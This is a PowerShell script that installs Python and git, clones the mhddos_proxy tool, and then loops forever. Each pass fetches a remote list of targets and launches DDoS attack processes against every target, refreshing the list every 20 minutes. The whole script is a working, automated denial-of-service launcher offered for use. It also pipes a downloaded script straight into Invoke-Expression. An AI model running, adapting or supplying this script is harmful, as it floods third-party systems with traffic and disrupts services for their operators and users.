# Installing Choco
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')) 
Set-Variable "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"

# Installing Python
choco install -y python3

# Installing GIT
choco install -y git

###
Set-Location '~'
Remove-Item 'mhddos_proxy' -Recurse -Force
git clone 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
Set-Location '~/mhddos_proxy'
python -m pip install -r 'requirements.txt'

$p = ' -p 1200'
$rpc = ' --rpc 1000'
$debug = ' --debug'

# Restart attacks and update targets every 20 minutes
while($true){
    Stop-Process -Name "Python" -Force 

    # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.    
    $targets = ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
    Write-Output $('Number of targets in list: ' + $targets.Length) 

    while ($targets.Length -eq 0) {
        Start-Sleep(5)
        $targets = ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets').Content | Select-String -AllMatches -Pattern '(?m)^[^#\s].*$').Matches
        Write-Output $('Number of targets in list: ' + $targets.Length) 
    }
    
    foreach ($target in $targets) { 
        $runner_args = $('runner.py ' + $target.Value + $p + $rpc + $debug + ' ' + $args)
        Write-Output $runner_args

        Start-Process -FilePath 'python' -WorkingDirectory '~/mhddos_proxy/' -ArgumentList $runner_args -NoNewWindow
        # Start-Job -ScriptBlock {Set-Location '~/mhddos_proxy/'; Write-Output $args; python runner.py $args} -ArgumentList $runner_args 
    }

    Start-Sleep(20*60) # Sleep for 20 minutes
}

